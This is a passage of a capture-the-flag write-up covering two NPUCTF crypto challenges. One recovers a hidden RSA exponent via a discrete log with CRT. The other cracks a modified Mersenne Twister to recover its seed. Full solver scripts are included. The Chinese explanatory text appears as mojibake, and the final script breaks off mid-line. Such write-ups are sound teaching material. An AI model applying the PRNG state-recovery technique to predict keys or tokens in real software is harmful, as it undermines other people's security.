    <entry>
      <title>WriteUp(NPUCTF) - Crypto</title>
      <link href="/2020/04/19/WriteUp-NPUCTF-Crypto/"/>
      <url>/2020/04/19/WriteUp-NPUCTF-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ"><a href="#è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ" class="headerlink" title="è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ"></a>è®¤æ¸…å½¢åŠ¿ï¼Œå»ºç«‹ä¿¡å¿ƒ</h3><h4 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>DLPæ±‚è§£</li><li>CRT</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶"><a href="#é¢˜ç›®æ–‡ä»¶" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="warm_up_683484967e8895fa6ba3db693e607491.zip.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = getPrime(<span class="number">25</span>)</span><br><span class="line">e = <span class="comment"># Hidden</span></span><br><span class="line">q = getPrime(<span class="number">25</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>))</span><br><span class="line"></span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print(c)</span><br><span class="line">print(pow(<span class="number">2</span>, e, n))</span><br><span class="line">print(pow(<span class="number">4</span>, e, n))</span><br><span class="line">print(pow(<span class="number">8</span>, e, n))</span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p>$n|GCD(c_1^{2}-c_2,c_1^{3}-c_3)$ï¼Œnæ˜“çŸ¥</p><p>$e\in(0,n)$ï¼Œå³$size(e)\leq 50$ï¼Œå¤šç§æ–¹æ³•éƒ½èƒ½æ±‚è§£è¯¥æ•°é‡çº§çš„DLPé—®é¢˜</p><p>è¿™é‡Œé‡‡ç”¨BSGSï¼Œä½†ç›´æ¥å¯¹nç”¨BSGSè¿˜æ˜¯èƒ½åˆ°$O(2^{25})$ï¼Œå› æ­¤å¯¹p, qåˆ†åˆ«BSGSå†CRTå³å¯</p><p>æœ¬é¢˜çš„$m\%n$æœ‰å¤šç§æƒ…å†µï¼Œé€ä¸€åˆ¤æ–­å³å¯</p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">128509160179202</span></span><br><span class="line">c2 = <span class="number">518818742414340</span></span><br><span class="line">c3 = <span class="number">358553002064450</span></span><br><span class="line">n = GCD(c1**<span class="number">2</span>-c2, c1**<span class="number">3</span>-c3)</span><br><span class="line">n.factor() <span class="comment"># 2 * 18195301 * 28977097</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">n //= <span class="number">2</span></span><br><span class="line">p = <span class="number">18195301</span></span><br><span class="line">q = <span class="number">28977097</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(g, y, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = int(ceil(sqrt(p - <span class="number">1</span>)))</span><br><span class="line">    S = &#123;pow(g, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m)&#125;</span><br><span class="line">    gs = pow(g, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[y])</span><br><span class="line">        y = y * gs % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">c1_p = c1 % p</span><br><span class="line">c1_q = c1 % q</span><br><span class="line">e_1 = bsgs(<span class="number">2</span>, c1_p, p)</span><br><span class="line">e_2 = bsgs(<span class="number">2</span>, c1_q, q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e_n = [] <span class="comment"># e % phi</span></span><br><span class="line"><span class="keyword">for</span> e_p <span class="keyword">in</span> e_1:</span><br><span class="line">    <span class="keyword">for</span> e_q <span class="keyword">in</span> e_2:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e_n.append(crt([e_p, e_q], [p - <span class="number">1</span>, q - <span class="number">1</span>])) <span class="comment"># e % phi</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">d_n = [inverse(e, phi) <span class="keyword">for</span> e <span class="keyword">in</span> e_n]</span><br><span class="line"></span><br><span class="line">m_n = set()</span><br><span class="line">c = <span class="number">169169912654178</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> d_n:</span><br><span class="line">    m_n.add(pow(c, d, n))</span><br><span class="line">m_n = list(m_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> m_n:</span><br><span class="line">    print(<span class="string">b'npuctf&#123;'</span> + long_to_bytes(m) + <span class="string">b'&#125;'</span>)</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="[More]"></a>[More]</h4><p>ç­¾åˆ°é¢˜â€¦ç»“æœæ²¡æ³¨æ„åŠ å¯†æºç é‡Œmçš„stripï¼Œä»¥ä¸º$m&gt;&gt;n$ï¼Œæ‰€ä»¥å…¶å®å·²ç»è§£å‡ºæ¥äº†è¿˜æ¥äº†å¥½ä¹…â€¦</p><h3 id="Mersenne-twister"><a href="#Mersenne-twister" class="headerlink" title="Mersenne_twister"></a>Mersenne_twister</h3><h4 id="é¢˜ç›®è€ƒç‚¹-1"><a href="#é¢˜ç›®è€ƒç‚¹-1" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>MTé€†ç®—æ³•</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶-1"><a href="#é¢˜ç›®æ–‡ä»¶-1" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="Mersenne_twister.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">26</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">'npuctf&#123;'</span></span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key , plain)</span>:</span></span><br><span class="line">    tmp = md5(plain).digest()</span><br><span class="line">    <span class="keyword">return</span> hexlify(XOR(tmp , key))</span><br><span class="line">...</span><br><span class="line">flag = flag.encode()</span><br><span class="line">random = mt73991(seed)</span><br><span class="line">f = open(<span class="string">'./cipher.txt'</span> , <span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    key = <span class="string">b''</span>.join([random.getramdanbits() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line">    cipher = encrypt(key , chr(i).encode())</span><br><span class="line">    f.write(cipher)</span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p>kpaé€†encryptå‡½æ•°ï¼Œå¯å¾—<code>mt_output[0]~mt_output[27],mt_output[100]~mt_output[103]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Next</span><span class="params">(self , tmp)</span>:</span></span><br><span class="line">    tmp ^= (tmp &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9ddf4680</span></span><br><span class="line">    tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc65400</span></span><br><span class="line">    tmp ^= (tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x34adf670</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure><p>ä»mt_output[i]æ¢å¤å‡ºstate[i]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self , seed)</span>:</span></span><br><span class="line">    self.state = [seed] + [<span class="number">0</span>] * <span class="number">232</span></span><br><span class="line">    self.flag = <span class="number">0</span></span><br><span class="line">    self.srand()</span><br><span class="line">    self.generate()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">srand</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">232</span>):</span><br><span class="line">        self.state[i+<span class="number">1</span>] = <span class="number">1812433253</span> * (self.state[i] ^ (self.state[i] &gt;&gt; <span class="number">27</span>)) - i</span><br><span class="line">        self.state[i+<span class="number">1</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">233</span>):</span><br><span class="line">        y = (self.state[i] &amp; <span class="number">0x80000000</span>) | (self.state[(i+<span class="number">1</span>)%<span class="number">233</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">        temp = y &gt;&gt; <span class="number">1</span></span><br><span class="line">        temp ^= self.state[(i + <span class="number">130</span>) % <span class="number">233</span>]</span><br><span class="line">        <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">            temp ^= <span class="number">0x9908f23f</span></span><br><span class="line">        self.state[i] = temp</span><br></pre></td></tr></table></figure><p>ä½†è¿™é‡Œå¾—åˆ°çš„stateæ˜¯generateä¸€è½®åçš„stateï¼Œæ‰€ä»¥è¦é€†å‡ºè‡³å°‘ä¸€ä¸ªold_state</p><p>å‘ç°<code>state[103]</code>å’Œ<code>state[0]</code>å·²çŸ¥ï¼Œä¸”ä¸<code>old_state[103]</code>å’Œ<code>old_state[104]</code>å­˜åœ¨ç­‰å¼å…³ç³»ï¼ˆ<code>old_state[104]</code>èƒ½ç”¨<code>state[103]</code>è¡¨ç¤ºï¼‰</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-20_00-22-17.png" alt></p><p>ä½†s104å¯èƒ½å­˜åœ¨ä¸¤ç§å¯èƒ½(In [26])ï¼Œå› æ­¤åœ¨In [28]ä¸­è¿›è¡Œä¸€æ¬¡åˆ¤æ–­ï¼Œæœ¬é¢˜ä¸­ä¸ºå”¯ä¸€è§£</p><p>å¾—åˆ°s104åé€†srandå‡½æ•°å³å¯å¾—åˆ°seed</p><p>(<code>&amp;=0xffffffff</code>ç­‰ä»·äº<code>%=0x100000000</code>ï¼Œå› æ­¤<code>(state[i+1]+i)*inverse(1812433253, 0x100000000)</code>å³å¯å¾—åˆ°<code>(self.state[i] ^ (self.state[i] &gt;&gt; 27))</code>ï¼Œè¿›è€Œå¾—åˆ°<code>state[i]</code></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[1]:</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[2]:</span></span><br><span class="line">cipher = unhexlify(open(<span class="string">"cipher.txt"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[3]:</span></span><br><span class="line">XOR = <span class="keyword">lambda</span> s1 ,s2 : bytes([x1 ^ x2 <span class="keyword">for</span> x1 ,x2 <span class="keyword">in</span> zip(s1 , s2)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[4]:</span></span><br><span class="line">prefix_mt_output = []</span><br><span class="line">prefix = <span class="string">b'npuctf&#123;'</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> prefix:</span><br><span class="line">    tmp = md5(chr(i).encode()).digest()</span><br><span class="line">    randnum = XOR(tmp, cipher[<span class="number">16</span> * j : <span class="number">16</span> * (j + <span class="number">1</span>)])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        prefix_mt_output.append(bytes_to_long(randnum[<span class="number">4</span> * k : <span class="number">4</span> * (k + <span class="number">1</span>)]))</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[5]:</span></span><br><span class="line">suffix_mt_output = [] <span class="comment">#output[100]~output[103]</span></span><br><span class="line">suffix = <span class="string">b'&#125;'</span></span><br><span class="line">tmp = md5(suffix).digest()</span><br><span class="line">randnum = XOR(tmp, cipher[<span class="number">16</span> * <span class="number">25</span> : <span class="number">16</span> * <span class="number">26</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    suffix_mt_output.append(bytes_to_long(randnum[<span class="number">4</span> * i : <span class="number">4</span> * (i + <span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[6]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftLeftXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = (<span class="number">0xffffffff</span> &gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &lt;&lt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftRightXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = ((<span class="number">0xffffffff</span> &lt;&lt; (<span class="number">32</span> - shift)) &amp; <span class="number">0xffffffff</span>) &gt;&gt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &gt;&gt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recoverState</span><span class="params">(value)</span>:</span></span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">18</span>, <span class="number">0x34adf670</span>)</span><br><span class="line">    value = unBitshiftLeftXor(value, <span class="number">15</span>, <span class="number">0xefc65400</span>)</span><br><span class="line">    value = unBitshiftLeftXor(value, <span class="number">7</span>, <span class="number">0x9ddf4680</span>)</span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">11</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[7]:</span></span><br><span class="line">prefix_state = []</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> prefix_mt_output:</span><br><span class="line">    prefix_state.append(recoverState(value))</span><br><span class="line">suffix_state = [] <span class="comment">#state[100]~state[103]</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> suffix_mt_output:</span><br><span class="line">    suffix_state.append(recoverState(value))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[22]:</span></span><br><span class="line">cur = suffix_state[<span class="number">-1</span>] <span class="comment">#state[103]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[23]:</span></span><br><span class="line">cur ^= prefix_state[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[24]:</span></span><br><span class="line"><span class="keyword">if</span> size(cur) &gt; <span class="number">31</span>: <span class="comment">#æœ€é«˜æ¯”ç‰¹ä¸€å®šè¦æ˜¯0</span></span><br><span class="line">    print(<span class="string">"old_state[104] &amp; 1 == 1"</span>)</span><br><span class="line">    cur ^= <span class="number">0x9908f23f</span> <span class="comment">#å¥‡æ•°</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"old_state[104] &amp; 1 == 0"</span>) <span class="comment">#å¶æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[25]:</span></span><br><span class="line">cur &lt;&lt;= <span class="number">1</span> <span class="comment">#å¶æ•°æœ«å°¾æ¯”ç‰¹=0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[26]:</span></span><br><span class="line">s104_1 = cur &amp; <span class="number">0x7fffffff</span></span><br><span class="line">s104_2 = s104_1 | <span class="number">0x80000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[27]:</span></span><br><span class="line">coef = inverse(<span class="number">1812433253</span>, <span class="number">0x100000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_srand</span><span class="params">(value, i)</span>:</span></span><br><span class="line">    value &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    value += i</span><br><span class="line">    value *= coef</span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">27</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[28]:</span></span><br><span class="line"><span class="keyword">if</span> inv_srand(s104_1, <span class="number">103</span>) &amp; <span class="number">0x80000000</span> == cur &amp; <span class="number">0x80000000</span>:</span><br><span class="line">    <span class="keyword">if</span> inv_srand(s104_2, <span class="number">103</span>) &amp; <span class="number">0x80000000</span> == cur &amp; <span class="number">0x80000000</span>:</span><br><span class="line">        print(<span class="string">"two cases found"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s104 = s104_1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s104 = s104_2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[29]:</span></span><br><span class="line">cur = s104</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">103</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    cur = inv_srand(cur, i)</span><br><span class="line">seed = cur</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[30]:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mt73991</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self , seed)</span>:</span></span><br><span class="line">        self.state = [seed] + [<span class="number">0</span>] * <span class="number">232</span></span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        self.srand()</span><br><span class="line">        self.generate()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">srand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">232</span>):</span><br><span class="line">            self.state[i+<span class="number">1</span>] = <span class="number">1812433253</span> * (self.state[i] ^ (self.state[i] &gt;&gt; <span class="number">27</span>)) - i</span><br><span class="line">            self.state[i+<span class="number">1</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">233</span>):</span><br><span class="line">            y = (self.state[i] &amp; <span class="number">0x80000000</span>) | (self.state[(i+<span class="number">1</span>)%<span class="number">233</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            temp = y &gt;&gt; <span class="number">1</span></span><br><span class="line">            temp ^= self.state[(i + <span class="number">130</span>) % <span class="number">233</span>]</span><br><span class="line">            <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">                temp ^= <span class="number">0x9908f23f</span></span><br><span class="line">            self.state[i] = temp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getramdanbits</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.flag == <span class="number">233</span>:</span><br><span class="line">            self.generate()</span><br><span class="line">            self.flag = <span class="number">0</span></span><br><span class="line">        bits = self.Next(self.state[self.flag]).to_bytes(<span class="number">4</span> , <span class="string">'big'</span>)</span><br><span class="line">        self.flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Next</span><span class="params">(self , tmp)</span>:</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9ddf4680</span></span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc65400</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x34adf670</span></span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[31]:</span></span><br><span class="line">random = mt73991(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[32]:</span></span><br><span class="line">pt = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    key = <span class="string">b''</span>.join([random.getramdanbits() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line">    pt += XOR(key, cipher[<span class="number">16</span> * i : <span class="number">16</span> * (i + <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[33]:</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str_set = string.printable.encode()</span><br><span class="line">md5_set = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str_set:</span><br><span class="line">    md5_set.append(md5(chr(i).encode()).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[34]:</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span 